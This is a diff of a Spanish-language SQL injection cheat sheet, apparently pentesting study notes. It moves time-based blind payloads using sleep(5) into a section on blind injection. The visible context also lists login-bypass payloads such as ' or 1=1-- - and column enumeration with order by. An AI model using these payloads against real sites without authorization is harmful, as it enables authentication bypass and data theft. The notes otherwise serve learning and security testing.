@@ -55,8 +55,6 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' or '1'='1                                         # La mas sencilla y nos devolveria un true, dejamos una comilla sin cerrar ya que la propia query la cerrara
 ❯ ' or 1=1-- -                                        # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion, pero devuelve todo en la bvase de datos cuando no se utiliza en el panel de login
 ❯ <user>'-- -                                         # Este se usa en un panel de login 
-❯ ' or sleep(5)-- -                                   # Haremos que tarde en responder la web 5 segundos
-❯ ' and sleep(5)-- -                                  # Haremos que tarde en responder la web 5 segundos
 ❯ ' order by 100-- -                                  # Haremos un ordenamiento con la 100va columna e iremos adivinando hasta que no nos marque un error
 ❯ ' and if()-- a        
 
@@ -171,6 +169,14 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 
 -   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
 Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** o **Condiciones**
+
+```bash 
+# Con un 'sleep' podemos suponer que la inyeccion es de tipo 'Blind'
+
+❯ ' and sleep(5)-- -                                  # Haremos que tarde en responder la web 5 segundos
+❯ ' or sleep(5)-- -                                   # Haremos que tarde en responder la web 5 segundos
+
+```
 
 ```bash 
 # Esto funciona cuando hay un error visual en la pagina web 
